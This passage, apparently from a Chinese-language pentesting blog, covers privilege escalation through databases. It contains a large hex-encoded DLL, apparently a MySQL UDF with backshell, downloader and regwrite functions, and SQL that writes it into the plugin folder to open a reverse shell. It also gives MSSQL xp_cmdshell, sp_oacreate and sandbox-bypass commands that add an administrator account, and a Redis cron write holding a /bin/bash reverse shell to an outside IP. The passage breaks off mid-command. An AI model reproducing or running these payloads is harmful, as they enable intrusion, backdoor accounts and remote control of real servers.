d4dd2e2e069b320d6db6845426edffce82244a0fe00febd18e82d9492c82616c4ccf953f45663c68a8caf1406a205df0b635b239f00562153fe9bba80167a244b46dc00fc5481557a70ec0ff8c210378ace8920416a0298be1e5a821ab000f249747694373714672d6d8e5cb403a11df7fdb6e906db306dc87c29f9d757e927d170deebb9de0f18cf5d0596edbcb85e11abf08e5b20f9c00a1b47cc4aa742f40fb885a91725de17281f5d7c82ee326ba886ade5f010f943b5eea141f29bbc359686a8eb3f06ff4edf81f7455dcbc218207272ec1cc7edaef85325e4b945149f70ded430ac08fce8b4d40dc0dac2627efc8d14a0132bd6c5ad3628dd30e6056aad384104f155ee94a0cc07a522545b8fc79e10de30b01b060b93718671b647e94773a894c689efe230fdf7bae5859bc9f532c6c38f73decfe7a0276fc12ace3636c0eb1adcd329b50afb51c24192b031b821835b2e686e422b25a54b1b72a399a1720b27f1e7d1522fee1cada382dc9c1faf308209710f3a8bf544924f75636524245ccec97e96af5ebd9fcaae7f0059864dd9ab6b2b7528389fb00ff09e9cab92223190693984eac3d38817040a17e108e57dcd60ecd5e2ddb488ce9ac3ab95204379b811d1b8a12155da4d22cbf2881475b9b438f699bca71c5b8fbe1c94e78ef82c1bc4409a104debdf71166547e49376600eab44e93d437afe65195997ddad56879f212bbb8397edeea03c7faebe65c87066b55405329ea797cbe88b4ca2833dbe96fa5137e31b47f38b72ac0fcc2308fbd2b588dfdcc0999a0d07f0ad127d9b84e8ff574b6e3593042d2f49ed904e7ba67b45b732ab4c6dc40f18442622e1e81858f2fe9b490751c81fe3241fc0259515bcb57793dee89339caf82ebfa6123fca946dabf7f5c118b0b650ca09955f7327b88cf99b3703e86107985d54d44cfa152e8c9e0916c1847573d9ee33ba02402df410da97f09140939d61e27856f05b6bd314401cffdd889ae450936428e488ce1c54583e24ef715c1c577e49c82b5f017e4e57033b3a95d3c65acac6e5b545e5f924326993855d842a286e520759fbc75e2b9678c3f3fd9497b2364c64670848140fd06b7201f376216612725b17ff5e91481cc3c3a9eb04770a76c29622959845298d09163e7f8a0858e88ca33aac8f2b18118a29793f344407c3fa10b414f20e4ddcc351cee0e78b7a140dabe320aa52963028226d79c8c0fb3b3b4fb20bff0a11200484c675cbbbe05b14d7dd3bf802d03fcd6f2fa5141df18591bfa2b98dd64bfb37b3c7aba257fa7df4a69257e35f69d2e1d0f6a2124f76ece02bd009efe870e04c1e4d033c59528ad4b533c2648a238b7a7b1dc8de9f05ea2bde344fe56aa1f8b1d3ef3511a39c64ed1bdc9fbf77b6045d9473e95c539d3a10e3de156635037b4b68a7dea0260016c379e4ffac60cf82fa256ba9cc7cb786b9993b5cfef4414926b845699d127d3e787abc1c694f947c668f3dcf4c0082cabba060934875ec4e675fdc8bf42cb9bd9c2c3a42dae53a5deb569af03bdec4dce2fc1b18f7c323e78d2f3c879751ec1ac21418a779c61caa259f09c132be604b97ba39e9e80b5eefa3160784c9ded268ee9e586872515df2e1864693a0cb251cd30630fb1d77eeb14072af0526ccbe387480053940a95f3f4b6a232ee3760dc397dc146d03748dad4161c67e0e3d1c123d6684464dbe59181af9d22efe145ef9cb9f722c271ee30a5c987ff95b5b87ebab0ed100b8d0ba83c37df4d6225bb9642224d4cfa211149cf5be32794d3c3c379c2e896a581d8364c80634449753ba980f608c203e703a7a65f721eaa487b5cf11cd6f294ff91b633a08e12404912f03af971d1cdb381ce1fd102414b52a235b495dfb7631644da524d068908d6eafcfa73f26086caacd2591fe006370ea5501dac27ff325a78067b9ee59652a05e8904decb7219ceba2744b0546ada587290363c4b5af950d4d64a72478f5356725227805e50cc7b714cf8f43e40b03ba7f867069482d164b54f3099e671a5803c881eccad2ae8aea6280b174863e271f77e94e1ffea81811ad5e60e8b87671f592a95b3264e94415ff66e8ab22bd2120b15a10bd99f8e0d74852e41dff820bd68635f84a004346944e99f9ca97f5cfe8fe1d949824b8c8918b57614c15e0f71fd9d84e5308950ce52cc19857dd16b81b3bc962db9cbbd8ea87e39e7fd59bd78e947eab77e0d16c58d3fb2530d622651b8ecefad13c7ad5bb0443720d7eef9ea65c763d1bc7886029f926071eb1debacbfb0fb551ab1d704cc82d957683c2d3d57d94c7752caf77632968b7e20ebd3fc56510657d630a227f0c9202af2870e71c231e252ecc2cde1f98f4110d6af64d4e1a88552be73e68f6283ca1a2a817b3149eed85818e499a65c19ab244bc7eb61db5ac35ed55faeca0b01664efd1f2da213274535bc7e41e1254f5a50824b12bb613b27266dabe3bd62e2145b5da0cd726d122a6281b1ca86fe9df66483ea1083573ee3ed4121837d4cc85f0eee2c02afc46e7be8eda706d3467c7fe6ee7fe5facaa9e6dd1249cfc92fd403a9cd43b9944656afb643cd54663281c71eaab46e2c63df9c0619d80e156f885ff9b02b676de154024d95345c770adcd7325468597b44d6b3d29bed4fafc002c7a987fd1bdb9febe59e350ce37610562d99286604b171ae985d20ff53c64a39831d93137cfc76810ca2c671715c09b2dfc52167240be4a6cdbc905ec95f8604149cbc9cf560f004c608306e2f90bc703be4d257c885bb7c6375a8a988431b1dde742064f0fc4b8d294c8b34844e383c1ca393acadf1c1da8ff9b13f4c70ed8208ee2c0670c1aed365ba0fce7d874fcc0addd9d74077e9d9cb230545ee35dacee2605b29a7f863bc58e0b2423a7b3a2326563210329a492cabc9f44406de4e8c14fb78d9059dbc286b6b27f01dbdc947caccee3675c19f54118d5ea0b98740e9102d2459c63811876d0a0ecd9bd55edaa60e4eecfbdef30a9ac33f952402a62c97dcb061d018c0fc6ee2760ca2eaadcdf6b397135c7875c47c36852076d607d4aac060812f601ac6f73dce3c7f50bb4aeb5369ebf65e14f43078de0dce84b270a743134db987b17710fc0d863a4791cee861a0a5568be977b1cf3b2e1eca312542df4324575f8c3e4661ed2b955bb7c48077d4952193496265740f6de6955e935cd67df798c2f77b645cb33ff297d90de4eee66384f8f5eaf5c761cde263c60619c1e1c09995d7799cc74689071abc4d310fc08f6d069cd4aa32e47beea8438d6b9aa9bdc100671c2e1b17e2014cbc782e2c7972bff99785bd2e4f2af6e6d7f46aaecc6958ddeabb52b4e93ca67fd2741af101cda966e83f822e29ec180c2bfb704a666fb9dde2ddbe8d389e98c3e3d360037860fce71598fd3444d133c21feddb993371f5f704d4ead8a116fbd09550382b62ffa1fa179b8b6eb1c9611f16a0bf4ec475aa9fb951c19c468f94fd1c2d3ec793bce76a50969ff8f39214de1f714633bbd8aced6b71034b95c38a640c51289794c4191499f9bf013e5aa9e9928b675e96ce2358b14abac50cde601ee9fdba355bc0d48900ded3bba6d8e761a5b36ab0b2480422889d0081a3adccf83cc621fbc5e110c2d2e9a5d9dab399a324c7d01ff7dac85933351e552b7b0fe2132b319b630f93e642aeb2af777627148aff3ebbf6dfebdd1985e91cdbe9a4b47bbc7e189cfd4a9de568d974d13b596f4b5c10a01b487e1191b8e742aa752ae89147256501e30918f7be67e03b4f4869c55817dd2358e438359b7cd22fd1affabd78518b91f3248e2d839ade3dcfaba45ab72519c5fcc6d7db4bee7840c1b2c23834c7d8079d42c4ff6b8b9291e0e5773b41b716bd6ea94ab8e8934eb81e9326737a06b320b1c98919f8654b0c6e2ce3b792f42465f4506e54900a654233b468ded6bcf7b99fe25754c35cb1c67dee159d9db365eda9fa979115b668008c15f3564401b4b74e082355a596b776ab5c14a7d998f844a48c8e1bf5406dddf8b56c6641dbf0cd68e7e98a2e8d2b829ee342ee65ae34c23b9d2823768fbd80024db4970abccdf91b0e92ae2fbeb2822633ee42dc7622e2ef9c7b0b60dcdd181e2271cef8e0a4a161c700b17c40fea711edd36ca33513d433f109c657d4b610be67f5b17ea714162dbf40e74576613a316bdc75f3572c0dc12fe3c7487249d00c5afaa4ad3d854ba763dabc807da78996e6585b9a6bcfe2956ee3691778ea9d6ee8027e309b066d67116d0c2eafcad749a4858c362aa0eb6d56a28aee9a2bdf22b401c6361d8d13818dbdb2e220ecddb361b622b3f1577fd50722b4f9523378249a4d5968bcf6214c9837991a576e07b556dedfe9d1e7613ee28e1edfd080c943e518582fcb90f41cc60e74a22953d67a042fb24b522db482529b6348645c622dda250b3506ce19c9f2cdb202a454db52f3f73be52026726147717f70b7d3872e4c945104eca84d4f652ac71e87c4b94470626784c6654fdd968dd81d472745d4720341d9307e436a92b29b1a419bf024b70700a0d2c1133c3911f081ba1bce9dd0b74499fc6da58e19165d5e452c8469aac1e2a2e5687b98e081f05e73122b7b4bac513d7ec8a940c648b44bba80076273189858549b283ab363d0eb9e8962462a24f1bbd96db00922744e9484f09aae326461e57da8679c14d41b1986f33682aa70d91efe6d0dd81b65d26000463b8c3429c8f93f0801d71ab1123611b93e5f3a7a278c363c6797957950849f39974d6193ab8fdef30087e1fc96db7c3b78c11c4be00ae617a04e27c74f5c83cc81a95a5cedb752118622f6196fb9853fce4897de28494d5d94763cacd6e8d97892fe00380a2a34fa194882958020ed4b39800b2b01306475074cca32d398589d4ca1686ee3a11b1f918b89948927ee3a097f737456cb43e774bf1913c7c7431b911071a4c4bd30e96e28f0d786d3826ee76c53cc875f5b827e203a8702bba2b4760d0f22f58e56180744172384f5abc11d833bf1201387ba60af29a88da9161af85a07eb4c30deb23732d60e82d415d6bd9eeae750b9284be41c5efab738a1ca5702686579806948960390ed4c0ca7d219eb1ed0cc479c4c516589783c784dbeb284e0d50ad2856b81737d1012273e69f91fbd05fa0ff37283cb44d10f41c44665ced2c42ccc15c365c05f2fbd5a7b99975627c99f5ba39e3dfe1a0b9b6efe4f9d859d33f7a5d9b080b1b7ae7d026c7d0c52ec3dc4a60e5cc7fd7c0faa209f46d531611d88635e8da5b6cbff371d6cdb40eaf94f44a90f5ef96d54a1c148c140feb739837c52c56119c1fbe898ab2242972e028faff901de8679f2d83d3e8094453a80f163dfd6218b72ecbee21a2770d4d0fa9cfe524e8d918d59df5e0e260686966e021d93504fe98e8a5a3113bfdc29a4732ee00c31b6b9471ffe1bdd91625ba0dc6314e2f7c6d14903995692a5730580894c6875679680d71d4470557c76cca1317fa1e3a437c0bb133b98b2b1934ec5ae18dca6b69f3854eae3e9156ed84abe3112abed69eb79c1251126e14b9b3924ee2453d7f3b216d22649464155a0591fc0af92ea6b810e66cce1db14d168161fc7883e994c7f0a5ff401e3f9c1f08439e4333f553c1b84b308ee8fbb2d13f8ff8247aef5b1ca08f1028d70840ea0aa923a1ed861e42358b7ae207a156e333d0f1aed6534b9a4e68b3922d4586598b710128e901855c95fa47bca65bdce83540d78a774028838677d6075eb1ecfd0ecec38650ccc45a05edda1a8e414056aa4db23404ee8fd9411f8f78930ca9713d6d465f95d0bc687bc39f27c2c0057a50e92a0c95e4f4b37411028a07ae76cf3260bb086ee656c033a3ef5b89fbc97996e06243d3f33851476afd328da79f62d1e95a27bf451b943766a50c238ad4b3dece8f4049686494642bca8ae162c69c48c8b9a89161572808b691c5638af59d2bf26b68af0a3adf17eed396890cfcec6e8aaa42742a5fe92073d66d3e2b7baa8f6c473e2f48e9c9e0f7b0b7f7f37399784a2937cc6dcd4871724b2d33a6be15add1908800c8cf92fde2d6fca5a2f55e46a9e2e19ce040739500b33100cce91b6da78009e61b066448dbe4226cc2fb0ee6a027112d9b2e200bf7d197889b3d0f945032488f614a6803b3119b368322825ce5b235a69a6f147ac2341195aa5f3c190eca877c3c66508d99f968d6a350290dffb9da9c4fb4f60b368d3aaa809fc127b2a0bd8eaefb1fa4ccda9d168065ecbbd4766b173e886abce1cf23053a4855e1d6e2f4fb2bf9c07c56fc6d2f27acb2ef8c2f012cc2898b56f32c02a70c5009dd8e35797717ffdcbd233256161ee254d1b1accd2b6133a5fc376babdc4c0d5811c89deadaed2ef047c6364a690fe998b944e996fcbf8c237dbeebf6d764f713a39e8e01efa008b949b13ae7e04017bf1d85071928869984bf78f6a3695586492efae813ce2c252dc92fb8db3beb32cb78a5b057ef9f6bc3524e462c121f4c6c3b29083979c85cfc73e8e5b2500e9785eaf5ea409134606c8a50f1fc68571303807ac06ef9bdc138cdaf1d545b361b25ec793a30c765de9b4199076f41da8ae675a21f321a4060eee1fc25bc992561ef6c1b332747f9b4517c316dd1d68b950c671cd3ea2e42480a0b82901058b355b59bf72d65f6eb33f3f49bb9bef7b514b908255051e8385386939423d47625377cfbe22f85b904dc6029c207a65288e98ff01f215c12507ce986939be440458c000f9475cb4b4704dacb7656330bd06485064678fc603392ecf35a512d76382232fe2889b8e0e7418e9264c0ff1120a56c63b3c08c0eb703464c1c4dd4ba417d11ddec9f67d814ee0c5df50c173b2634c8b6b18cda4d86047a47579847bd1490aca83c8be538bb02f4569d2e200daffd04a47089bbdb0acdf3d2e2772a0fb12d37485ec8883c1253bc84457f3670704b9ee898e978a5593b73aeef92f10f9020ec60cee25e327fe2055c0b29125f72ff67d28b31bdc778d74bd1c39ed6bf2c44ecc2a61ea5f742f6a0c1857001c1b07e56db98c6db1331bdc727a7dc98d2a3f5c5f7cba0c2fc783155c08e4eb337138dd2fc43c6aa607722b0cb90f6afe3f1226d31d5237851cc1dfed5dbc055027361094c50c67b7be979e07c9d5a3f698a9871ae81bcf53c70c611f5de85ccebf2a10cf7016e10483c6125ae8c5660f9269480ae025af71d8923d9ea95b20abe3c71e97e59b8278271dc5722dca6883ba3fc70dd206fb555af8206b03180dae4538642c1d88eea507d8d2cd3cf435660614f87f10cce23786e9376f51e47e4d3202499fa1e3fb3e2e0549e6ef0880fab18dd3032d55b32d484217349380806a72e46888d9b57bccc8aec8be2bd30007367de32d69c5b950fc82ae6b32bd7f512321c7bac127ffeb31c2d52c779ae836304f63cf89c2ec612cd32edec1fa2a7f9c128b6db5f064457dcc9817640a1d0edfce1776f20a4f531f59035345f668bea438eb47e0659f0b1e4180090a81653c7e5303739a6f87b51bef9491d498d1a51e9802d12842f5dd845a3dc54a82ee140424e26c6025939a116092a30a7ab03745b0e5ac7983b0c4537bcda2393ad2d6d24dc642c3e1aa38b4b83679722b97469f3f0e28d1aad08daabbdf3f0335f0abfd33b9bdcfc8f95829ca6064853ad2a2e856771e0c0c952369705cdef3b919340e086e073ddd9c9896e783f3610cb4ae23aa06d2bfc281bdf515696bdf1ae28eb7f8cb1e3280ca948e3d2c89b1ccb7f341fefc7ea193c7477e3d81df3799a685fa2dbd1aa8f7c6d164fa73f44c306fd495979b5b03ad9e29995ab445a89ee792b7cbe5c4829204d3418a29a6e5bc1375d575860f01fa456d8efe52b50f64f221b9372551a5d491ae31660c4928176d974136903e8cd04779424a9d09dec08654ba8bb880bdde1120039f89d38eccbac4436bf382e4e73956ee3b2be95a6659cb96412b14032b5676a321173882ae645390237ced2d62eeaae20f3f52e4c164ce074e0e2cad94dd4c189f19b88991aebc2cffcf522b373d7644c026fd890e0b652261af984a1469ce004fd3464b3949812bc602eeb055c72b2e645a3ace286d9e7d924b0604043e632a3ca026699de5484bcfa7001d5b479761a99eda72d51c9de7345ce00d4c35dfb044b8907fe1bbcb58f5b207aa748746af5e2837116c2f75d4371705986868f6de4e700fc56b91c86c1d3cb4c5c3c9016c3ab6379895fd56adc7c0613eba6d239df1bc48e218233b370930b9dd78627c87c89a4237b00f51b12f75227807372b3204e67138359a647bbe5e8f2f9114ca5518d4c582de609c2958058ce5cf095d5233abf344648bf2a91aa61cf13d6fcaf526e8c69d8a0cccd3aaf850798bc8802a2896a737eb791de6bf660e042843df3e8b68fca1065c5963fd128c7e8f1e9971f5a9f9d7131f075a98143a4de0e456eee823cf6988192a4e372172bdfbf7301bef7d260bb60126a1356857d698df62b5e7ac5e02b4bdc0f1eb22d953b95fa0c6b802f2235bbc31d04d11b46d2da5d8cd6d4f2fad666b3c0060e809000000bb930200e90602000033c95e870ee3f42bf18bdead2bd8ad03c35097ad91f3a55ead5691011eade2fbad8d6e10015d008d7d1cb51cf3ab5ead53505197588d54855cff1672572c037302b0003c0772022c03500fb65fffc1e303b3008d1c5b8d9c9d0c100000b001e3298bd72b550c8a2a33d284e90f95c652fec68ad08d1493ff165a9f12c0d0e9740e9e1af274e4b40033c9b501ff560833c9ff661cb1308b5d0c03d1ff16734c03d1ff16721903d1ff1672293c07b0097202b00b508bc72b450c8a00ff661883c260ff16875d10730c03d1ff16875d147303875d183c07b0087202b00b50538bd5035638ff560c5b91ff66303c07b0077202b00a50875d10875d14895d188bd503563cff560c6a035950483bc172028bc1c1e006b1408d9c857c030000ff56043c048bd8725f33dbd1e813db48439143d3e380f9058d949d7c010000762e80e90433c08b5500d16d088b120fca2b550403c03b550872078b550840015504ff5610e2e0b104d3e003d88d551c33c0534051d3e08bda91ff560433d259d1e813d2e2fa5b03da4359895d0c568bf72bf3f3a4ac5eb180aa3b7e247303ff6620588b4e405f5a57e31b8a074704183c0273f78b073c0775f1b0000fc80346142bc7abe2e58b5e2856528b762c46ad85c05a742203c2525697ff53fc95ac84c075fb380674e78bc679054633c066ad5055ff13abebe7595f8b4944e30d33c0ac3c04720c03f80117e2f361e9e89bfdff2c017208740ac1e008acebe866adebe4adebe1508b450852c1e80bf7228b55008b120fca2b55043bc25a761089450833c0b4082b02c1e8050102eb0e0145042945088b02c1e8052902f9589c807d0b00750bff4500c1650408c16508089dc333c0408d1483ff1613c03bc172f52bc1c3b108ff168d5204b001730bff16b0097305c1e105b011508d1c82ff56045b03c3c30e0000001e00000000000000000000000000000002000000e99702000000000000000000000000000000000000000000010000001e0000001e00000031980200e5980200a99802006022000060290000b0240000c024000060290000b0240000802c000060290000b02400008029000060290000b02400002010000060290000b02400003014000060290000b02400009016000060290000b0240000601b000060290000b0240000b01e000060290000b0240000a026000060290000b024000000000100020003000400050006000700080009000a000b000c000d000e000f0010001100120013001400150016001700180019001a001b001c001d005d990200699902007c9902008d99020099990200ac990200bd990200c3990200d0990200db990200e5990200f6990200059a02000e9a02001e9a02002c9a0200379a0200499a0200599a0200629a0200729a0200809a0200889a0200979a0200a49a0200ad9a0200bd9a0200cb9a0200d09a0200dc9a02004b696c6c50726f63657373004b696c6c50726f636573735f6465696e6974004b696c6c50726f636573735f696e69740050726f63657373566965770050726f63657373566965775f6465696e69740050726f63657373566965775f696e69740061626f75740061626f75745f6465696e69740061626f75745f696e6974006261636b7368656c6c006261636b7368656c6c5f6465696e6974006261636b7368656c6c5f696e697400636d647368656c6c00636d647368656c6c5f6465696e697400636d647368656c6c5f696e697400646f776e6c6f6164657200646f776e6c6f616465725f6465696e697400646f776e6c6f616465725f696e6974006f70656e33333839006f70656e333338395f6465696e6974006f70656e333338395f696e6974007265677265616400726567726561645f6465696e697400726567726561645f696e69740072656777726974650072656777726974655f6465696e69740072656777726974655f696e6974007368757400736875745f6465696e697400736875745f696e697400</span>);</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> Ghost(data LONGBLOB);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Ghost <span class="keyword">values</span>(&quot;&quot;);</span><br><span class="line"><span class="keyword">update</span> Ghost <span class="keyword">set</span> data <span class="operator">=</span> <span class="variable">@a</span>;</span><br><span class="line"><span class="keyword">select</span> data <span class="keyword">from</span> Ghost <span class="keyword">into</span> DUMPFILE <span class="string">&#x27;C:\\phpstudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll&#x27;</span>; # 导出位置需要绝对路径</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> backshell <span class="keyword">returns</span> string soname <span class="string">&#x27;udf.dll&#x27;</span>;# 创建backshell函数绑定udf.dll文件</span><br><span class="line"><span class="keyword">select</span> backshell(<span class="string">&#x27;接受shell ip地址&#x27;</span>,<span class="number">7788</span>)</span><br></pre></td></tr></table></figure><p>该方式的本质也和udf提权相同，只不过把原来msf生成的dll文件改为用16进制的方法进行写入然后进行导出，绑定函数，再利用函数反弹shell</p><h2 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h2><blockquote><p>已经拿到webshell</p></blockquote><h3 id="1、xp-cmdshell"><a href="#1、xp-cmdshell" class="headerlink" title="1、xp_cmdshell"></a>1、xp_cmdshell</h3><blockquote><p>xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重修开启它。</p></blockquote><p>sql server默认是支持外联的可以直接使用Navicat进行连接，如果不能外联可以使用哥斯拉等进行连接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启用xp_cmdshell：</span></span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行命令：</span></span><br><span class="line">EXEC master.dbo.xp_cmdshell &#x27;命令&#x27;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果xp_cmdshell被删除了，可以上传xplog70.dll进行恢复</span></span><br><span class="line">exec master.sys.sp_addextendedproc &#x27;xp_cmdshell&#x27;, &#x27;C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll&#x27;</span><br></pre></td></tr></table></figure><p><img src="/posts/29c025a9/1677722813577-ce5ce3da-d0f9-430d-87aa-38ebe25e520c.png" alt="image.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关闭xp_cmdshell</span></span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">reconfigure;</span><br><span class="line">exec sp_configure &#x27;xp_cmdshell&#x27;, 0;</span><br><span class="line">reconfigure;</span><br></pre></td></tr></table></figure><h3 id="2、sp-oacreate"><a href="#2、sp-oacreate" class="headerlink" title="2、sp_oacreate"></a>2、sp_oacreate</h3><blockquote><p>主要是用来调用OLE对象，利用OLE对象的run方法执行系统命令。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启用：</span></span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;   </span><br><span class="line">RECONFIGURE WITH OVERRIDE;   </span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;   </span><br><span class="line">RECONFIGURE WITH OVERRIDE;   </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行(执行结果写入到目标主机C:/1.txt)：</span></span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt;c:\\1.txt&#x27;</span><br></pre></td></tr></table></figure><p><img src="/posts/29c025a9/1677722887826-b359495f-2ffa-4289-b2a1-cc01f53fc1d9.png" alt="image.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关闭sp_oacreate：</span></span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;   </span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 0;   </span><br><span class="line">RECONFIGURE WITH OVERRIDE;  </span><br></pre></td></tr></table></figure><h3 id="3、SQL-Server-沙盒提权"><a href="#3、SQL-Server-沙盒提权" class="headerlink" title="3、SQL Server 沙盒提权"></a>3、SQL Server 沙盒提权</h3><blockquote><p>沙盒模式SandBoxMode参数含义（默认是2）<br>0：在任何所有者中禁止启用安全模式<br>1：仅在允许范围内<br>2：必须在access模式下<br>3：完全开启<br>openrowset是可以通过OLE DB访问SQL Server数据库，OLE DB是应用程序链接到SQL Server的的驱动程序。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启show advanced options</span></span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure; </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">开启Ad Hoc Distributed Queries，不开启的话在执行xp_regwrite会提示让我们开启，</span></span><br><span class="line">exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,1;reconfigure;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。</span></span><br><span class="line">exec master..xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,0; </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。</span></span><br><span class="line">exec master.dbo.xp_regread &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;, &#x27;SandBoxMode&#x27; </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行系统命令</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">添加一个新用户</span></span><br><span class="line">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net user margin margin /add&quot;)&#x27;)</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">加入到administrators组</span></span><br><span class="line">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net localgroup administrators margin /add&quot;)&#x27;)</span><br></pre></td></tr></table></figure><p><img src="/posts/29c025a9/1677723061298-9588e612-cde0-49a5-b7c3-ea00b9da00f8.png" alt="image.png"><br><img src="/posts/29c025a9/1677723403092-c223b3c2-3e88-4f72-8fa9-fe182f77dffa.png" alt="image.png"><br>恢复配置</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> master..xp_regwrite <span class="string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="string">&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;</span>,<span class="string">&#x27;SandBoxMode&#x27;</span>,<span class="string">&#x27;REG_DWORD&#x27;</span>,<span class="number">1</span>; </span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;Ad Hoc Distributed Queries&#x27;</span>,<span class="number">0</span>;reconfigure; </span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">0</span>;reconfigure;</span><br></pre></td></tr></table></figure><h2 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h2><blockquote><p>已经拿到webshell 已经数据库账号密码<br>利用工具一把梭：<a href="https://github.com/jas502n/oracleshell">https://github.com/jas502n/oracleshell</a></p></blockquote><h3 id="1、普通用户模式"><a href="#1、普通用户模式" class="headerlink" title="1、普通用户模式"></a>1、普通用户模式</h3><p>前提是拥有一个普通的oracle连接账号，不需要DBA权限，可提权至DBA，并以oracle实例运行的权限执行操作系统命令。</p><h3 id="2、DBA用户模式"><a href="#2、DBA用户模式" class="headerlink" title="2、DBA用户模式"></a>2、DBA用户模式</h3><p>拥有DBA账号密码，可以省去自己手动创建存储过程的繁琐步骤，一键执行测试。<br><img src="/posts/29c025a9/1677725931276-47bf96ee-932d-4b8e-944d-8eaab014f9af.png" alt="image.png"></p><h3 id="3、注入提升模式"><a href="#3、注入提升模式" class="headerlink" title="3、注入提升模式"></a>3、注入提升模式</h3><p>拥有一个oracle注入点，可以通过注入点直接执行系统命令，此种模式没有实现回显</p><h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><p>连接(未授权或有密码)-利用如下方法提权<br>采用未授权直接利用，密码进入需获取配置文件读取</p><h3 id="1、计划任务反弹Shell"><a href="#1、计划任务反弹Shell" class="headerlink" title="1、计划任务反弹Shell"></a>1、计划任务反弹Shell</h3><p>1、设置键值为反弹命令的计划任务写法<br>2、设置写入目录为&#x2F;var&#x2F;spool&#x2F;cron&#x2F;<br>3、设置写入文件名为xiaodi<br>4、保存执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">redis未授权利用</span></span><br><span class="line">redis-cli -h 192.168.63.130</span><br><span class="line">set x “\n* * * * * /bin/bash -i &gt; /dev/tcp/192.168.52.111/6666 0&lt;&amp;1 2&gt;&amp;1\n”</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename testshell</span><br><span 